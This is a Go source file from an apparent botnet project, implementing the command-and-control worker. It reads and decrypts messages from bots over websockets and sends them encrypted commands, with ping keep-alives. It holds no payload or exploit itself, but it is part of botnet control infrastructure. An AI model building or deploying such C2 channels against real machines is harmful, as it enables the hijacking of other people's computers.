package ccworker

import (
	"encoding/json"
	"log"
	"time"

	"github.com/adrianosela/botnet/lib/encryption"
	"github.com/adrianosela/botnet/lib/protocol"
	"github.com/gorilla/websocket"
)

const (
	writeWait      = 10 * time.Second    // Time allowed to write a message to the peer
	pongWait       = 60 * time.Second    // Time allowed to read the next pong message from the peer
	pingPeriod     = (pongWait * 9) / 10 // Send pings to peer with this period. Must be less than pongWait
	maxMessageSize = 1024                // Maximum message size allowed from peer
)

func (b *BotWorker) reader() {
	b.wsConn.SetReadLimit(maxMessageSize)
	b.wsConn.SetReadDeadline(time.Now().Add(pongWait))
	b.wsConn.SetPongHandler(func(string) error { b.wsConn.SetReadDeadline(time.Now().Add(pongWait)); return nil })
	for {
		// get the next message
		msgType, encryptedMessage, err := b.wsConn.ReadMessage()
		if err != nil {
			if websocket.IsUnexpectedCloseError(err, websocket.CloseGoingAway, websocket.CloseAbnormalClosure) {
				log.Printf("WS connection was closed unexpectedly: %s", err)
			}
			break
		}
		// discard all non binary type (non encrypted) messages
		if msgType != 2 {
			continue
		}
		msg, err := protocol.DecryptMessage(encryptedMessage, b.msgDecryptKey)
		if err != nil {
			log.Printf("failed to decrypt a message from bot %s: %s", b.ID, err)
			continue
		}
		msg.BotID = b.ID // attach bot ID to message and forward to server controller
		b.msgFwdChan <- msg
	}
}

func (b *BotWorker) writer() {
	ticker := time.NewTicker(pingPeriod)
	defer func() {
		ticker.Stop()
		b.wsConn.Close()
	}()
	for {
		select {
		case cmd, ok := <-b.CmdOutChan:
			b.wsConn.SetWriteDeadline(time.Now().Add(writeWait))
			if !ok {
				log.Println("we shouldnt get here though")
				b.wsConn.WriteMessage(websocket.CloseMessage, []byte{})
				return
			}
			cmdJSONBytes, err := json.Marshal(cmd)
			if err != nil {
				return
			}
			encryptedCmd, err := encryption.EncryptMessage(cmdJSONBytes, b.cmdEncryptKey)
			if err != nil {
				return
			}
			b.wsConn.WriteMessage(websocket.BinaryMessage, encryptedCmd)
		case <-ticker.C:
			b.wsConn.SetWriteDeadline(time.Now().Add(writeWait))
			if err := b.wsConn.WriteMessage(websocket.PingMessage, nil); err != nil {
				return
			}
		}
	}
}
